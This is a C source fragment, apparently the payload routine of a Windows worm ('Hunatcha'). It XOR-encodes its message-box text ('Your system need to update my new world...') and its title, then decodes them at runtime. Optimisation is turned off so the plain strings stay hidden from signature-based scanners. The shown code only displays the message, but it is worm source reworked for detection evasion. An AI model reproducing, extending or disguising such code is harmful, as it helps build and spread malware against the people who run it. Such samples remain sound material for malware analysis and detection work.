#pragma optimize("", off)
#include "data_globals.h"
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

void _Payload(void)
{
    char wormpath[MAX_PATH];
    GetModuleFileNameA(NULL, wormpath, MAX_PATH);
    // (wormpath is unused, as in original)

    // "Your system need to update my new world..." with key 0x3E
    volatile char sz_msg[] = {
        'Y'^0x3E, 'o'^0x3E, 'u'^0x3E, 'r'^0x3E, ' '^0x3E, 's'^0x3E, 'y'^0x3E, 's'^0x3E,
        't'^0x3E, 'e'^0x3E, 'm'^0x3E, ' '^0x3E, 'n'^0x3E, 'e'^0x3E, 'e'^0x3E, 'd'^0x3E,
        ' '^0x3E, 't'^0x3E, 'o'^0x3E, ' '^0x3E, 'u'^0x3E, 'p'^0x3E, 'd'^0x3E, 'a'^0x3E,
        't'^0x3E, 'e'^0x3E, ' '^0x3E, 'm'^0x3E, 'y'^0x3E, ' '^0x3E, 'n'^0x3E, 'e'^0x3E,
        'w'^0x3E, ' '^0x3E, 'w'^0x3E, 'o'^0x3E, 'r'^0x3E, 'l'^0x3E, 'd'^0x3E, '.'^0x3E,
        '.'^0x3E, '.'^0x3E, 0x00^0x3E
    };
    xor_decrypt(sz_msg, sizeof(sz_msg), 0x3E);

    // "Hunatcha Informer" with key 0x7A
    volatile char sz_title[] = {
        'H'^0x7A, 'u'^0x7A, 'n'^0x7A, 'a'^0x7A, 't'^0x7A, 'c'^0x7A, 'h'^0x7A, 'a'^0x7A,
        ' '^0x7A, 'I'^0x7A, 'n'^0x7A, 'f'^0x7A, 'o'^0x7A, 'r'^0x7A, 'm'^0x7A, 'e'^0x7A,
        'r'^0x7A, 0x00^0x7A
    };
    xor_decrypt(sz_title, sizeof(sz_title), 0x7A);

    MessageBoxA(NULL, (LPCSTR)sz_msg, (LPCSTR)sz_title, MB_ICONINFORMATION);
}
#pragma optimize("", on)
